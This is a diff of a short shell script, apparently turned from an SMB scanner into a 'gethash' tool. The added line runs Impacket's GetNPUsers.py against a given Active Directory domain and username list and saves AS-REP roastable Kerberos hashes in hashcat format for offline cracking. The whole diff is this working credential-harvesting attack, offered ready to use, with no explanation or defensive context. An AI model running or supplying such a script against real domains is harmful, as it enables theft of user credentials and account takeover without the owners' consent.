@@ -10,6 +10,7 @@ if [ $# -eq 0 ]
 fi
 
 echo ""
-echo "Syntax: smbscan 'DC IP address'" 
-echo "Example: ./smbscan.sh 10.10.10.10"
+echo "Syntax: gethash 'domain' 'usernamesfile'" 
+echo "Example: ./gethash.sh mydomain.local usernames.txt"
 echo " "
+python GetNPUsers.py "$1"/-usersfile "$2" -format hashcat -outputfile hashes."$1".txt
